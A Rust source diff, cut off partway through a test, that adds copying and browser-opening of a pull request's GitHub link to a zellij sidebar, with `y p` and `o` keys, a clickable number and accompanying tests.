@@ -3,7 +3,9 @@
 //! says, beside the zellij luneta runs. A row takes zellij's client there, and
 //! `▌` marks the pane it is on. `•` dots a pane where something finished since
 //! you were last there, and one you marked unread, and `u` takes the dot away
-//! or gives it. The menu opens at its bottom, for the row highlighted, or
+//! or gives it. A click on the number of a row's pull request copies its link,
+//! as `y p` does the highlighted row's, and `o` opens that in your browser. The
+//! menu opens at its bottom, for the row highlighted, or
 //! floats over zellij, for the pane zellij is on, and its Brief group asks
 //! for a brief of the agents by that row, or that pane, as its `a` asks for
 //! the ask box. Its title along the top is in the accent while it has the
@@ -34,7 +36,7 @@
 
 use std::collections::{BTreeMap, HashMap, HashSet};
 use std::fmt;
-use std::num::NonZeroU64;
+use std::num::{NonZeroU32, NonZeroU64};
 use std::ops::Range;
 use std::time::{Duration, Instant, SystemTime};
 
@@ -85,13 +87,17 @@ use crate::order::{Colour, Order};
 use crate::own::{Look, Looked, OwnClient, Unplaced};
 use crate::picker::{Here, Listing, Live, Runs, Seated, Shown};
 use crate::printed::Printed;
-use crate::pull::{Link, Ready, Work, Worked};
+use crate::pull::{Kind, Link, Ready, Work, Worked};
 use crate::skills::{Name, Skill};
 use crate::spots::{Drawn, Keyed, Spots};
 use crate::zellij::{Closes, Open, SessionName, Tab, Within};
 
 /// How many columns the sidebar takes until its edge is dragged.
 pub const COLUMNS: u16 = 32;
+
+/// How long the notes say a pull request's link was copied, where no key takes
+/// that back sooner: a click on its number can leave the keys with zellij.
+const COPIED_SHOWS: Duration = Duration::from_secs(3);
 
 /// The fewest columns the sidebar is dragged to, where the terminal has twice
 /// as many: enough for a session's name on its row.
@@ -691,9 +697,45 @@ struct Checkout {
     branch: String,
     /// How its work tree stands, as starship shows it.
     status: String,
-    /// The number of its pull request, and the colour of its state, if it
-    /// has one to show.
-    pull_request: Option<(u32, Color)>,
+    /// Its pull request, if it has one to show.
+    pull_request: Option<Numbered>,
+}
+
+/// A pull request, as its branch's line shows it: its number, in the colour
+/// of its state.
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct Numbered {
+    number: Number,
+    colour: Color,
+}
+
+/// A pull request's number on its branch's line: its link says it where it has
+/// one, so that what the row shows and what a click copies are of one pull
+/// request.
+#[derive(Clone, Debug, PartialEq, Eq)]
+enum Number {
+    Linked(Box<Link>),
+    /// Its daemon says no link of this number on GitHub: older than the link,
+    /// or on another host, or with what does not read as one.
+    Unlinked(NonZeroU32),
+}
+
+impl Numbered {
+    /// How its branch's line shows it.
+    fn shown(&self) -> String {
+        match &self.number {
+            Number::Linked(link) => link.tab(),
+            Number::Unlinked(number) => format!("#{number}"),
+        }
+    }
+
+    /// Its link, where it has one.
+    fn link(&self) -> Option<&Link> {
+        match &self.number {
+            Number::Linked(link) => Some(link),
+            Number::Unlinked(_) => None,
+        }
+    }
 }
 
 impl Row {
@@ -976,6 +1018,10 @@ pub enum Asked {
     Review { on: Machine, pid: u32, does: Move },
     /// Take the focus from zellij, as a click on the sidebar does.
     Take,
+    /// Put this on the clipboard of luneta's terminal.
+    Copy(Link),
+    /// Open this page in the browser of the machine luneta runs on.
+    Browse(Link),
     /// Give the focus back to zellij.
     Leave,
     /// Ask zellij on `on` what closing the pane `pane` of `session` closes,
@@ -1130,10 +1176,10 @@ pub struct Sidebar {
     /// The row the keys took the highlight to, from `here_row` as the
     /// sidebar took the focus, or a click to.
     cursor: Option<Spot>,
-    /// Whether the key before was `Top::First`'s, which moves the highlight
-    /// to the first row once pressed again. Any other key drops it, `Esc`
-    /// doing nothing else, and so do a click, the wheel and the focus going.
-    first_pressed: bool,
+    /// What the key before waits for the next to finish. Any other key drops
+    /// it, `Esc` doing nothing else, and so do a click, the wheel and the
+    /// focus going.
+    pending: Pending,
     /// What `v` and the left button do to the order of the machines and
     /// their sessions.
     moving: Moving,
@@ -1148,6 +1194,9 @@ pub struct Sidebar {
     room: usize,
     /// The last thing that went wrong, until the next key.
     notice: Option<String>,
+    /// The number of the pull request whose link was copied last, and when,
+    /// for the notes to say, until the next key or `COPIED_SHOWS` from then.
+    copied: Option<(NonZeroU32, SystemTime)>,
     /// The machine an image is on its way to, once that takes a while.
     image_going: Option<Destination>,
     /// What is being read aloud, or what that waits for.
@@ -1179,6 +1228,18 @@ pub struct Sidebar {
 struct Closing {
     gone: Spot,
     after: Option<Spot>,
+}
+
+/// What a key waits for the next to finish, one at a time: `gg` or `y p`.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+enum Pending {
+    #[default]
+    Nothing,
+    /// `Top::First` was pressed, which moves the highlight to the first row
+    /// once pressed again.
+    First,
+    /// `Top::Yank` was pressed, which waits for what to yank.
+    Yank,
 }
 
 /// What `v` and the left button do to the order of the machines and their
@@ -1369,6 +1430,8 @@ impl Sidebar {
     /// line of the rows, or the last, long enough for them to scroll.
     pub fn ticked(&mut self, now: SystemTime, at: Instant, watched: bool) {
         self.hold(at);
+        let over = |then: SystemTime| now.duration_since(then).is_ok_and(|it| it >= COPIED_SHOWS);
+        self.copied.take_if(|(_, then)| over(*then));
         if let Some(session) = self.own.session() {
             let listed = clients(self.on_sessions(), session).map(<[Client]>::to_vec);
             let pane = self.own.pane();
@@ -1585,7 +1648,7 @@ impl Sidebar {
         if had == holds {
             return;
         }
-        self.first_pressed = false;
+        self.pending = Pending::Nothing;
         if holds {
             if self.here_row.is_some() {
                 self.cursor.clone_from(&self.here_row);
@@ -2479,7 +2542,8 @@ impl Sidebar {
     /// one it has not is the menu's.
     pub fn key(&mut self, key: &KeyEvent, now: SystemTime) -> Asked {
         self.notice = None;
-        let first_pressed = std::mem::take(&mut self.first_pressed);
+        self.copied = None;
+        let pending = std::mem::take(&mut self.pending);
         if self.pressed() {
             if key.code == KeyCode::Esc {
                 self.let_go();
@@ -2509,20 +2573,23 @@ impl Sidebar {
             KeyCode::Left => self.fold(true),
             KeyCode::Right => self.fold(false),
             KeyCode::Enter => return self.go(),
-            // As in vim, it only takes the `g` back.
-            KeyCode::Esc if first_pressed => {},
+            // As in vim, it only takes the `g` or the `y` back.
+            KeyCode::Esc if pending != Pending::Nothing => {},
             KeyCode::Esc => return Asked::Leave,
+            KeyCode::Char(menu::YANK_PULL) if pending == Pending::Yank => return self.yank(now),
             KeyCode::Char(c) => match Top::of(c) {
                 Some(Top::Move(by)) => self.step(by),
                 Some(Top::Last) => self.end(true),
-                Some(Top::First) if first_pressed => self.end(false),
-                Some(Top::First) => self.first_pressed = true,
+                Some(Top::First) if pending == Pending::First => self.end(false),
+                Some(Top::First) => self.pending = Pending::First,
+                Some(Top::Yank) => self.pending = Pending::Yank,
                 Some(Top::Fold(Some(folded))) => self.fold(folded),
                 Some(Top::Fold(None)) => self.toggle(),
                 Some(Top::Menu) => return self.open_menu(None),
                 Some(Top::Command(Command::Search)) => self.find(String::new()),
                 Some(Top::Command(Command::Unread)) => self.toggle_unread(now),
                 Some(Top::Command(Command::Reorder)) => self.select(),
+                Some(Top::Command(Command::Open)) => return self.browse(),
                 // Without a selection, there is nothing to move.
                 Some(Top::Shift(_)) => {},
                 None => return self.open_menu(Some(c)),
@@ -2530,6 +2597,61 @@ impl Sidebar {
             _ => {},
         }
         Asked::Nothing
+    }
+
+    /// The link of the pull request the highlighted row shows the number of;
+    /// or why there is none.
+    fn highlighted_link(&self) -> Result<Link, String> {
+        let row = self.cursor.as_ref().and_then(|spot| self.row_of(spot));
+        let Some(Row::Pane { checkout: Some(Checkout { pull_request: Some(numbered), .. }), .. }) =
+            row.map(|at| &self.rows[at])
+        else {
+            return Err("no pull request on this row".to_owned());
+        };
+        numbered.link().cloned().ok_or_else(|| {
+            format!("{}: lunetad says no link of it on github.com", numbered.shown())
+        })
+    }
+
+    /// `y p`: copies the link of the highlighted row's pull request, at `now`,
+    /// or says why there is none.
+    fn yank(&mut self, now: SystemTime) -> Asked {
+        match self.highlighted_link() {
+            Ok(link) => self.copy(link, now),
+            Err(why) => {
+                self.notify(why);
+                Asked::Nothing
+            },
+        }
+    }
+
+    /// Has luneta copy `link`, at `now`, which the notes say, as a copy shows
+    /// nothing on its own.
+    fn copy(&mut self, link: Link, now: SystemTime) -> Asked {
+        self.copied = Some((link.number(), now));
+        Asked::Copy(link)
+    }
+
+    /// `o`: has luneta open the highlighted row's pull request in your
+    /// browser, or says why there is none.
+    fn browse(&mut self) -> Asked {
+        match self.highlighted_link() {
+            Ok(link) => Asked::Browse(link),
+            Err(why) => {
+                self.notify(why);
+                Asked::Nothing
+            },
+        }
+    }
+
+    /// What a click on the number of a pull request does, at `now`, on
+    /// whichever row: copies its link and nothing else, wherever the keys and
+    /// the highlight are. It drops what the key before waits for, as any
+    /// click does.
+    pub fn number_clicked(&mut self, link: Link, now: SystemTime) -> Asked {
+        self.notice = None;
+        self.pending = Pending::Nothing;
+        self.copy(link, now)
     }
 
     /// What a key does while a selection lasts: `j` and `k` move its end at
@@ -2875,7 +2997,7 @@ impl Sidebar {
     /// would take an `Enter` meant for the search.
     pub fn keys_clicked(&mut self, keyed: Keyed, key: &KeyEvent, now: SystemTime) -> Asked {
         let there = match self.bottom() {
-            Bottom::Legend => Some(Keyed::Legend),
+            Bottom::Legend | Bottom::Yank => Some(Keyed::Legend),
             Bottom::Search(_) => Some(Keyed::Search),
             Bottom::Menu(_) | Bottom::Nothing => None,
         };
@@ -2890,7 +3012,7 @@ impl Sidebar {
     /// it and what went wrong before.
     fn pick(&mut self, name: &Name) -> Asked {
         self.notice = None;
-        self.first_pressed = false;
+        self.pending = Pending::Nothing;
         let Some(menu) = self.menu.take() else {
             return Asked::Nothing;
         };
@@ -3436,13 +3558,14 @@ impl Sidebar {
     /// header, once the mouse moves a line, and lets go of it where it shows;
     /// and the wheel scrolls.
     pub fn mouse(&mut self, mouse: MouseEvent, area: Rect) -> Asked {
-        // A click or the wheel drops a `g` pressed before it, as a key does.
+        // A click or the wheel drops a `g` or a `y` pressed before it, as a key
+        // does.
         // The pointer moving does not: luneta hears every move.
         if matches!(
             mouse.kind,
             MouseEventKind::Down(_) | MouseEventKind::ScrollDown | MouseEventKind::ScrollUp
         ) {
-            self.first_pressed = false;
+            self.pending = Pending::Nothing;
         }
         match mouse.kind {
             MouseEventKind::ScrollDown => {
@@ -3683,7 +3806,8 @@ impl Sidebar {
     /// changes. What the mouse lifted has it, where it lands, the others
     /// making room for it. Its last column is the edge, drawn as the title's
     /// rule is.
-    /// Says the spots on the menu at its bottom, or on the legend.
+    /// Says the spots on the menu at its bottom, or on the legend, and on the
+    /// numbers of the pull requests on its rows.
     pub fn draw(&mut self, buffer: &mut Buffer, area: Rect, now: SystemTime) -> Drawn {
         self.drawing(now);
         let width = usize::from(area.width.saturating_sub(1));
@@ -3743,11 +3867,20 @@ impl Sidebar {
             None => (0..self.rows.len()).collect::<Vec<_>>(),
         };
         let mut drawn: Vec<Line<'static>> = Vec::new();
+        // Where each number is, by its line among all those of the rows. None
+        // takes a click under what the mouse lifted.
+        let mut numbers = Vec::new();
         for at in order {
             let row = &self.rows[at];
             let on = lit.as_ref().filter(|(rows, _)| rows.contains(&at));
             let background = on.map(|(_, background)| *background);
-            for mut line in row_lines(row, width, frame, now) {
+            let (row_drawn, number) = row_lines(row, width, frame, now);
+            if landing.is_none()
+                && let Some(number) = number
+            {
+                numbers.push(NumberAt { line: drawn.len() + number.line, ..number });
+            }
+            for mut line in row_drawn {
                 if let Some(background) = background {
                     line = line.patch_style(Style::new().bg(background));
                 }
@@ -3760,9 +3893,20 @@ impl Sidebar {
         lines.resize(notes_from, Line::default());
         lines.extend(notes);
         put(buffer, area, &lines, self.framing());
-        // The notes go along the bottom, short of the edge.
+        let mut spots = Spots::default();
+        let shown = self.top..self.top + room;
+        for NumberAt { line, columns, link } in numbers {
+            if shown.contains(&line) {
+                spots.add(HEADER + line - self.top, columns, link.clone());
+            }
+        }
+        // The rows and the notes go short of the edge, the notes along the
+        // bottom.
         let inside = Rect { width: area.width.saturating_sub(1), ..area };
-        spotted.placed(notes_from, inside)
+        Drawn::Sidebar {
+            numbers: spots.placed(inside),
+            bottom: Box::new(spotted.placed(notes_from, inside)),
+        }
     }
 
     /// Draws the sidebar collapsed into `area`: a rule along the top, and
@@ -3873,8 +4017,9 @@ impl Sidebar {
     /// What goes at the bottom of a sidebar `height` tall: why the daemon
     /// does not answer, the sessions it lists that the rows leave out, the
     /// session files of Claude Code's it cannot read, what went wrong last,
-    /// and the menu while it is open, or else the search while that is, or
-    /// else the legend while the sidebar has the focus.
+    /// which pull request's link was copied, and the menu while it is open, or
+    /// else the search while that is, or else the legend while the sidebar has
+    /// the focus.
     /// The menu, the search and the legend leave the rows a line. And what has
     /// the mouse there, the menu or the keys of the search or the legend, with
     /// the spots on it by their line among the notes. A spinner on the menu
@@ -3928,6 +4073,9 @@ impl Sidebar {
         if let Some(notice) = &self.notice {
             notes.extend(wrapped(notice, width, error));
         }
+        if let Some((number, _)) = &self.copied {
+            notes.extend(wrapped(&format!("copied #{number}"), width, Style::new().fg(NAME)));
+        }
         if let Some(to) = &self.image_going {
             let going = format!("image on its way to {to}");
             notes.extend(wrapped(&going, width, Style::new().fg(NAME)));
@@ -3955,6 +4103,10 @@ impl Sidebar {
             },
             Bottom::Legend => {
                 let (lines, spots) = menu::legend(width, room);
+                (lines, Drawn::Keys(Keyed::Legend, spots.down(above)))
+            },
+            Bottom::Yank => {
+                let (lines, spots) = menu::yanks(width, room);
                 (lines, Drawn::Keys(Keyed::Legend, spots.down(above)))
             },
             Bottom::Nothing => (Vec::new(), Drawn::Nothing),
@@ -4015,15 +4167,15 @@ impl Sidebar {
     }
 
     /// What the sidebar shows under its rows: the menu while it is open
-    /// there, or else the search while that is, or else the legend while the
-    /// sidebar has the keys.
+    /// there, or else the search while that is, or else, while the sidebar
+    /// has the keys, what `y` waits for while it does, or else the legend.
     fn bottom(&self) -> Bottom<'_> {
         if let Some(menu) = self.menu.as_ref().filter(|_| !self.floats()) {
             Bottom::Menu(menu)
         } else if let Some(search) = &self.search {
             Bottom::Search(search)
         } else if self.keys == Keys::Sidebar {
-            Bottom::Legend
+            if self.pending == Pending::Yank { Bottom::Yank } else { Bottom::Legend }
         } else {
             Bottom::Nothing
         }
@@ -4036,6 +4188,8 @@ enum Bottom<'a> {
     /// The search, as it stands.
     Search(&'a Search),
     Legend,
+    /// What `y` waits for, in the legend's place.
+    Yank,
     Nothing,
 }
 
@@ -4416,17 +4570,23 @@ fn checkout(tree: &WorkTree, pull_request: Option<&PullRequest>) -> Option<Check
     })
 }
 
-/// The number of a pull request and the colour of its state, which gh lists
-/// it in: green while it is open, grey while it is a draft, and purple once
-/// it is merged. A closed one is none.
-fn numbered(pull_request: &PullRequest) -> Option<(u32, Color)> {
+/// A pull request as its branch's line shows it, in the colour of its state,
+/// which gh lists it in: green while it is open, grey while it is a draft, and
+/// purple once it is merged. A closed one is none. What its daemon says of its
+/// page is taken only as this pull request's link: another machine's says it,
+/// and the clipboard and the browser take what they are handed.
+fn numbered(pull_request: &PullRequest) -> Option<Numbered> {
     let colour = match pull_request.state {
         State::Open => gruvbox::GREEN,
         State::Draft => gruvbox::GREY,
         State::Merged => gruvbox::PURPLE,
         State::Closed => return None,
     };
-    Some((pull_request.number.get(), colour))
+    let number = pull_request.number;
+    let link = pull_request.url.as_deref().and_then(Link::parse);
+    let link = link.filter(|link| link.kind() == Kind::Pull && link.number() == number);
+    let number = link.map_or(Number::Unlinked(number), |link| Number::Linked(Box::new(link)));
+    Some(Numbered { number, colour })
 }
 
 /// The glyph of each kind of change there is, then the one for where the
@@ -4474,8 +4634,23 @@ pub fn frame(now: SystemTime) -> usize {
     usize::try_from(turns % frames).expect("a frame of the spinner's")
 }
 
-/// The lines a row is drawn on, `width` wide.
-fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line<'static>> {
+/// Where the number of a pull request with a link is, on the lines of a row, for
+/// a click to copy that link.
+struct NumberAt<'a> {
+    /// Which of them it is on.
+    line: usize,
+    columns: Range<usize>,
+    link: &'a Link,
+}
+
+/// The lines a row is drawn on, `width` wide, and where they have a number that
+/// takes a click.
+fn row_lines(
+    row: &Row,
+    width: usize,
+    frame: usize,
+    now: SystemTime,
+) -> (Vec<Line<'static>>, Option<NumberAt<'_>>) {
     let dim = Style::new().add_modifier(Modifier::DIM);
     match row {
         Row::Machine { name, heads: Heads::Away(away), .. } => {
@@ -4486,7 +4661,7 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
             let reserve = if age.is_empty() { 0 } else { age.width() + 1 };
             let said = cut(&format!("{name} · {word}"), width.saturating_sub(5 + reserve + 1));
             let gap = width.saturating_sub(5 + said.width() + age.width() + 1);
-            vec![Line::from(vec![
+            let line = Line::from(vec![
                 Span::raw(" "),
                 Span::styled(FOLDED, dim),
                 Span::raw(" "),
@@ -4495,7 +4670,8 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
                 Span::styled(said, dim),
                 Span::raw(" ".repeat(gap)),
                 Span::styled(age, dim),
-            ])]
+            ]);
+            (vec![line], None)
         },
         Row::Machine { name, heads: Heads::Sessions { under, waiting, dot, busy, here }, .. } => {
             let folded = *under == Under::Folded;
@@ -4521,7 +4697,7 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
                 spans.push(Span::raw(" "));
                 spans.push(badge);
             }
-            vec![Line::from(spans)]
+            (vec![Line::from(spans)], None)
         },
         Row::Session { session, hits, under, here, colour, waiting, dot, busy, .. } => {
             let folded = *under == Under::Folded;
@@ -4546,7 +4722,7 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
                 spans.push(Span::raw(" "));
                 spans.push(badge);
             }
-            vec![Line::from(spans)]
+            (vec![Line::from(spans)], None)
         },
         Row::Pane {
             here, unread, marked, icon, label, hits, checkout, review, bracket, speaks, ..
@@ -4591,14 +4767,21 @@ fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> Vec<Line
             }
             spans.push(Span::styled(age, dim));
             let mut lines = vec![Line::from(spans)];
+            let mut number = None;
             if let Some(checkout) = checkout {
-                lines.push(checkout_line(*here, gutter(*bracket, 1, height), checkout, width));
+                let at = lines.len();
+                let (drawn, columns) =
+                    checkout_line(*here, gutter(*bracket, at, height), checkout, width);
+                lines.push(drawn);
+                let link = checkout.pull_request.as_ref().and_then(Numbered::link);
+                let number_at = |(columns, link)| NumberAt { line: at, columns, link };
+                number = columns.zip(link).map(number_at);
             }
             if let Some(review) = review {
                 let at = lines.len();
                 lines.push(review_line(*here, gutter(*bracket, at, height), review, width));
             }
-            lines
+            (lines, number)
         },
     }
 }
@@ -4712,16 +4895,17 @@ fn gutter(bracket: Option<(Bracket, Color)>, at: usize, height: usize) -> Span<'
 /// works, under its label, then the number of its pull request, and how its
 /// work tree stands. The branch is cut to leave the other two whole. The mark
 /// of the pane luneta's zellij is on, `here`, runs down it too, and the
-/// `gutter` after it.
+/// `gutter` after it. And the columns the number is on, as the line has it, for
+/// a click to go by.
 fn checkout_line(
     here: bool,
     gutter: Span<'static>,
     checkout: &Checkout,
     width: usize,
-) -> Line<'static> {
+) -> (Line<'static>, Option<Range<usize>>) {
     let status = &checkout.status;
-    let number = checkout.pull_request.map(|(number, colour)| {
-        Span::styled(format!("#{number}"), Style::new().fg(colour))
+    let number = checkout.pull_request.as_ref().map(|numbered| {
+        Span::styled(numbered.shown(), Style::new().fg(numbered.colour))
     });
     let held = number.as_ref().map_or(0, |number| number.content.width() + 1);
     let reserve = if status.is_empty() { 0 } else { status.width() + 1 };
@@ -4733,13 +4917,16 @@ fn checkout_line(
         Span::raw(" ".repeat(LABEL - 2)),
         Span::styled(branch, Style::new().fg(gruvbox::GREY)),
     ];
+    let mut columns = None;
     if let Some(number) = number {
         spans.push(Span::raw(" "));
+        let start: usize = spans.iter().map(Span::width).sum();
+        columns = Some(start..start + number.width());
         spans.push(number);
     }
     spans.push(Span::raw(" ".repeat(gap)));
     spans.push(Span::raw(status.clone()));
-    Line::from(spans)
+    (Line::from(spans), columns)
 }
 
 /// The panes of `listed`, among `all` the sessions of a machine and its
@@ -4862,7 +5049,6 @@ pub fn wrapped(text: &str, width: usize, style: Style) -> Vec<Line<'static>> {
 
 #[cfg(test)]
 mod tests {
-    use std::num::NonZeroU32;
     use std::sync::LazyLock;
 
     use lunetad::api::shell::{ended, Ended, Going, Stopped};
@@ -5589,10 +5775,10 @@ mod tests {
         assert_eq!(lit, [6, 7]);
         // The legend leaves the rows four lines, which scroll a line for
         // the pane to show whole, and stay so once the focus goes.
-        let (_, lit) = seen(&mut sidebar, true, 32, 17);
+        let (_, lit) = seen(&mut sidebar, true, 32, 19);
         assert_eq!(lit, [5, 6]);
         sidebar.key(&KeyEvent::new(KeyCode::Char('k'), KeyModifiers::NONE), moment(160_000));
-        let (lines, lit) = seen(&mut sidebar, true, 32, 17);
+        let (lines, lit) = seen(&mut sidebar, true, 32, 19);
         let nvim = "▌    \u{e6ae} nvim src/main.rs";
         assert_eq!((lines[5].as_str(), lit.as_slice()), (nvim, &[4][..]));
         let (_, lit) = seen(&mut sidebar, false, 32, 14);
@@ -5650,7 +5836,7 @@ mod tests {
         }
         assert_eq!(cursor(&sidebar), second);
         // Tall enough for the legend to leave newer's row on screen.
-        let area = Rect::new(0, 0, 32, 18);
+        let area = Rect::new(0, 0, 32, 20);
         screen(&mut sidebar, true, area.width, area.height);
         sidebar.mouse(mouse(MouseEventKind::ScrollUp, 0, 0), area);
         sidebar.key(&g, moment(160_000));
@@ -5839,7 +6025,7 @@ mod tests {
         let up = KeyEvent::new(KeyCode::Char('k'), KeyModifiers::NONE);
         // Two lines, between the title and the rule along the top and the
         // legend at the bottom.
-        let shown = |sidebar: &mut Sidebar| screen(sidebar, true, 32, 15)[3..5].to_vec();
+        let shown = |sidebar: &mut Sidebar| screen(sidebar, true, 32, 17)[3..5].to_vec();
         assert_eq!(
             shown(&mut sidebar),
             [" ▾ older ────────────────── ●1", "   ● \u{ec82} fold                 1m"]
@@ -5925,7 +6111,7 @@ mod tests {
     #[test]
     fn a_click_on_the_notes_goes_nowhere() {
         let mut sidebar = two_sessions();
-        let area = Rect::new(0, 0, 32, 15);
+        let area = Rect::new(0, 0, 32, 17);
         let lines = screen(&mut sidebar, true, area.width, area.height);
         assert!(lines[5].starts_with("─ luneta ─"), "{lines:?}");
         assert_eq!(click(&mut sidebar, 10, 5, area), Asked::Take);
@@ -6549,7 +6735,7 @@ mod tests {
         let key = |c| KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE);
         let row = |sidebar: &mut Sidebar, now| {
             sidebar.ticked(now, steady(now), true);
-            seen_at(sidebar, true, 32, 16, now).0[4].clone()
+            seen_at(sidebar, true, 32, 18, now).0[4].clone()
         };
         let (new, seen) =
             ("  •✓ \u{ec82} fold                 1m", "   ✓ \u{ec82} fold                 1m");
@@ -6779,7 +6965,7 @@ mod tests {
     /// session's name: those under this machine's header down to the blank
     /// above the legend.
     fn rows_shown(sidebar: &mut Sidebar) -> Vec<String> {
-        let lines = screen(sidebar, true, 32, 24);
+        let lines = screen(sidebar, true, 32, 26);
         let rows = lines[sessions_from(&lines)..].iter().take_while(|line| !line.is_empty());
         rows.map(|line| line.trim_end_matches(['─', ' ']).to_owned()).collect()
     }
@@ -7036,15 +7222,366 @@ mod tests {
     fn char(c: char) -> KeyEvent {
         KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE)
     }
-    /// Each line of the sidebar drawn 32 by 16, from the line `from` down, as
+
+    const LINK: &str = "https://github.com/owner/repo/pull/246";
+
+    /// What `LINK` reads as.
+    fn link() -> Link {
+        Link::parse(LINK).expect("a link")
+    }
+
+    /// The branch `branch` checked out in `dir`, with `pull` for its pull
+    /// request, as lunetad says them in `work_trees` and `pull_requests`.
+    fn checked_out(
+        work_trees: &mut Vec<api::WorkTree>,
+        pull_requests: &mut Vec<api::PullRequest>,
+        dir: &str,
+        branch: &str,
+        pull: Option<(u32, State, Option<&str>)>,
+    ) {
+        let name = Said::new(branch.to_owned()).expect("a branch's name");
+        let head = Head::Branch { name, upstream: None };
+        let changes = Changes::default();
+        work_trees.push(WorkTree::Checkout { head, changes, stashes: 0 }.to_api(dir));
+        if let Some((number, state, url)) = pull {
+            let number = NonZeroU32::new(number).expect("a pull request's number");
+            let url = url.map(str::to_owned);
+            pull_requests.push(PullRequest { number, state, url }.to_api(dir));
+        }
+    }
+
+    /// The panes of a session `s`, by their id: 1 on a branch with a pull
+    /// request, 2 with one from a daemon too old to say its link, 3 with one
+    /// that is closed, and 4 with none.
+    fn pulls() -> Sidebar {
+        let dirs = ["/w/a", "/w/b", "/w/c", "/w/d"];
+        let panes = dirs.iter().zip(1..).map(|(cwd, id)| pane(id, id, cwd, "fish")).collect();
+        let mut host = host(vec![session("s", 10, panes)], Vec::new());
+        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
+        let closed = "https://github.com/owner/repo/pull/9";
+        checked_out(trees, pulls, "/w/a", "fix", Some((246, State::Open, Some(LINK))));
+        checked_out(trees, pulls, "/w/b", "old", Some((7, State::Open, None)));
+        checked_out(trees, pulls, "/w/c", "gone", Some((9, State::Closed, Some(closed))));
+        checked_out(trees, pulls, "/w/d", "none", None);
+        let mut sidebar = fresh();
+        sidebar.heard(host);
+        sidebar.focus(Keys::Sidebar);
+        sidebar
+    }
+
+    /// The columns of the line `y` a click hits a pull request's number on,
+    /// by `drawn`.
+    fn number_spot(drawn: &Drawn, y: u16) -> Vec<u16> {
+        let hits = |x: &u16| matches!(drawn.at(Position::new(*x, y)), Some(Hit::Number(_)));
+        (0..64).filter(hits).collect()
+    }
+
+    /// `y` waits for what to yank, which the bottom of the sidebar lists, and
+    /// `p` copies the link of the highlighted row's pull request. A note says
+    /// so, as a copy shows nothing, in no colour of what went wrong, until the
+    /// next key, or a while after: a click may leave the keys with zellij.
+    #[test]
+    fn y_p_copies_the_highlighted_row_s_link_and_a_note_says_so() {
+        let mut sidebar = pulls();
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        let now = moment(160_000);
+        assert_eq!(sidebar.key(&char('y'), now), Asked::Nothing);
+        let (lines, _) = seen_at(&mut sidebar, true, 32, 24, now);
+        let rule = format!("─ Yank {}", "─".repeat(24));
+        assert_eq!(lines[22..], [rule, " p  PR link".to_owned()]);
+
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
+        let buffer = drawn_at(&mut sidebar, true, 32, 24, now);
+        let (lines, _) = seen_at(&mut sidebar, true, 32, 24, now);
+        let note = lines.iter().position(|line| line == " copied #246").expect("the note");
+        assert_eq!(buffer[(1, u16::try_from(note).unwrap())].fg, NAME);
+        assert!(lines.iter().any(|line| line.starts_with("─ luneta ──")), "the legend is back");
+
+        let shown = |sidebar: &mut Sidebar, millis| {
+            let at = moment(millis);
+            sidebar.ticked(at, steady(at), true);
+            seen_at(sidebar, false, 32, 24, at).0.contains(&" copied #246".to_owned())
+        };
+        assert!(shown(&mut sidebar, 162_999));
+        assert!(!shown(&mut sidebar, 163_000));
+
+        assert_eq!(sidebar.key(&char('y'), now), Asked::Nothing);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
+        sidebar.key(&char('j'), now);
+        assert_eq!(sidebar.copied, None);
+    }
+
+    /// `Esc` after `y` only drops it, as after a lone `g`. Any other key
+    /// drops it and does what it does, and so does a click: `p` then has
+    /// nothing to finish.
+    #[test]
+    fn y_waits_for_one_key_and_esc_only_drops_it() {
+        let mut sidebar = pulls();
+        let one = Spot::Local(pane_of("s", 10, 1));
+        sidebar.cursor = Some(one.clone());
+        let now = moment(160_000);
+        let esc = KeyEvent::from(KeyCode::Esc);
+        sidebar.key(&char('y'), now);
+        assert_eq!(sidebar.key(&esc, now), Asked::Nothing);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
+        assert_eq!(sidebar.key(&esc, now), Asked::Leave);
+
+        sidebar.key(&char('y'), now);
+        sidebar.key(&char('j'), now);
+        assert_eq!(cursor(&sidebar), Some(pane_of("s", 10, 2)));
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
+
+        sidebar.cursor = Some(one);
+        let area = Rect::new(0, 0, 32, 24);
+        sidebar.key(&char('y'), now);
+        sidebar.mouse(mouse(MouseEventKind::ScrollUp, 10, 4), area);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
+
+        // The pointer moving is no click: luneta hears every move.
+        sidebar.key(&char('y'), now);
+        sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), area);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(link()));
+    }
+
+    /// A click on the `y` of the legend presses it, and on the `p` that takes
+    /// the legend's place copies, as the keys do.
+    #[test]
+    fn a_click_on_y_then_on_p_copies() {
+        let mut sidebar = pulls();
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        let now = moment(160_000);
+        assert_eq!(sidebar.keys_clicked(Keyed::Legend, &char('y'), now), Asked::Nothing);
+        let clicked = clicks(&mut sidebar, 17);
+        assert_eq!(clicked[1], (" p  PR link".to_owned(), Some(on_legend('p'))));
+        let copied = sidebar.keys_clicked(Keyed::Legend, &char('p'), now);
+        assert_eq!(copied, Asked::Copy(link()));
+    }
+
+    /// `y p` and `o` go by the number the row shows: where it shows none, or
+    /// one whose daemon did not say its link, they only leave a note. A
+    /// session's row has none, and neither does a machine's header.
+    #[test]
+    fn the_keys_only_leave_a_note_on_a_row_with_no_link() {
+        let none = "no pull request on this row";
+        let old = "#7: lunetad says no link of it on github.com";
+        let rows = [
+            (Spot::Local(pane_of("s", 10, 2)), old),
